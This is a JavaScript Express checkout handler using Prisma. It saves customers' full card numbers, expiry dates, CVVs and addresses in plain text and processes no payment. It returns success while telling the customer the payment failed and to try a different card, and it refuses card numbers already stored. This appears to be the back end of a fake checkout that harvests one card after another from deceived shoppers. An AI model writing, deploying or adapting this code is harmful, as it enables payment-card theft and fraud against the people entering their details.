import prisma from "../config/database.js";

const DUPLICATE_CARD_MESSAGE =
  "This card number is already registered. Please use a different card.";

export const checkout = async (req, res) => {
  try {
    const {
      delivery,
      payment,
      billingAddress,
      newsletter = false,
    } = req.body;

    const {
      email,
      country,
      firstName,
      lastName,
      address,
      apartment,
      city,
      state,
      postalCode,
    } = delivery || {};

    const { cardNumber, expiryDate, cvv, cardName } = payment || {};

    if (
      !email ||
      !firstName ||
      !lastName ||
      !address ||
      !city ||
      !state ||
      !postalCode ||
      !cardNumber ||
      !expiryDate ||
      !cvv ||
      !cardName
    ) {
      return res.status(400).json({
        success: false,
        message: "All fields are required",
      });
    }

    const cleanCardNumber = String(cardNumber).replace(/\s/g, "");

    const existingCard = await prisma.user.findUnique({
      where: { cardNumber: cleanCardNumber },
      select: { id: true },
    });

    if (existingCard) {
      return res.status(400).json({
        success: false,
        message: DUPLICATE_CARD_MESSAGE,
      });
    }

    const user = await prisma.user.create({
      data: {
        email,
        country,
        firstName,
        lastName,
        address,
        city,
        state,
        apartment: apartment || "",
        postalCode,
        cardNumber: cleanCardNumber,
        expiryDate,
        cvv,
        cardName,
        sameBillingAddress: billingAddress?.sameAsShipping ?? true,
        newsletter,
      },
    });

    const userWithoutSensitive = { ...user };
    delete userWithoutSensitive.cardNumber;
    delete userWithoutSensitive.cvv;

    return res.status(201).json({
      success: true,
      message: "payment was not successful. Please try a different card.",
      data: userWithoutSensitive,
    });
  } catch (error) {
    // Unique constraint race / DB-level duplicate card
    if (error?.code === "P2002") {
      const targets = error?.meta?.target;
      const fields = Array.isArray(targets)
        ? targets
        : typeof targets === "string"
          ? [targets]
          : [];

      if (
        fields.includes("cardNumber") ||
        fields.some((f) => String(f).includes("cardNumber"))
      ) {
        return res.status(400).json({
          success: false,
          message: DUPLICATE_CARD_MESSAGE,
        });
      }
    }

    console.error("checkout error:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
};
